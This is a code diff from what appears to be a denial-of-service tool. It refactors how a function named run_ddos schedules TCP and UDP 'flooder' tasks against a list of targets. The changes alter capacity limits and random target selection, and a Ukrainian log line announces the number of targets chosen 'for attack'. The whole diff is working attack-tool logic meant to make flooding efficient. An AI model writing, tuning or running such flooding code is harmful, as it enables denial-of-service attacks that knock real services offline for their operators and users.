@@ -25,15 +25,14 @@ from src.targets import Target, TargetsLoader
 
 
 class GeminoCurseTaskSet:
-
     def __init__(
         self,
         loop: asyncio.AbstractEventLoop,
         runnables: List[AsyncTcpFlood],
-        initial_capacity: int = 2,
-        max_capacity: int = 10_000,
-        fork_scale: int = 2,
-        failure_delay: float = 0.25
+        initial_capacity: int,
+        max_capacity: int,
+        fork_scale: int,
+        failure_delay: float
     ):
         self._loop = loop
         self._tasks = runnables
@@ -178,7 +177,7 @@ async def run_ddos(
 
         stats.clear()
 
-        tcp_flooders, udp_flooders, force_install = [], [], False
+        tcp_flooders, udp_flooders = [], []
         for target in targets:
             assert target.is_resolved, "Unresolved target cannot be used for attack"
             # udp://, method defaults to "UDP"
@@ -197,22 +196,19 @@ async def run_ddos(
             else:
                 logger.error(f"Unsupported scheme given: {target.url.scheme}")
 
+        force_install = False
         if tcp_flooders:
-            num_flooders = len(tcp_flooders)
+            num_allowed_flooders = max(int(total_threads * SCHEDULER_MAX_INIT_FRACTION), 1)
             adjusted_capacity = initial_capacity
-            num_init = adjusted_capacity * num_flooders
-            num_allowed_flooders = int(total_threads * SCHEDULER_MAX_INIT_FRACTION)
-            if num_allowed_flooders == 0:
-                # presumably this is not going to happen
-                raise RuntimeError("Capacity initialization error")
-
-            if num_init > num_allowed_flooders:
+            num_flooders = len(tcp_flooders)
+            if adjusted_capacity * num_flooders > num_allowed_flooders:
                 adjusted_capacity = 1
+                # If adjusting capacity is not enough, select random tcp_flooders
                 if num_flooders > num_allowed_flooders:
                     random.shuffle(tcp_flooders)
-                    tcp_flooders = tcp_flooders[:num_allowed_flooders]
-                    num_flooders = len(tcp_flooders)
+                    tcp_flooders, num_flooders = tcp_flooders[:num_allowed_flooders], num_allowed_flooders
                     logger.info(f"{cl.MAGENTA}Обрано {num_flooders} цілей для атаки{cl.RESET}")
+                    force_install = True
 
             # adjust settings to avoid situation when we have just a few
             # targets in the config (in this case with default CLI settings you are
